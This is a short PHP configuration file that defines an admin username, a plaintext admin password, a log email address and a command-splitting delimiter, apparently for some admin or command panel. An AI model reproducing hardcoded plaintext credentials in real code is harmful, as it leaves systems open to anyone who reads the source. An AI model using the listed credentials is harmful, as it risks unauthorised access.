<?php
define('ADMIN_USUARIO', 'byvolk');
define('ADMIN_PASSWORD', 'filtrovolk');
define('EMAIL_LOGS','iwolknet@gmail.com');
define('CMD_SPLIT','<i>')
?>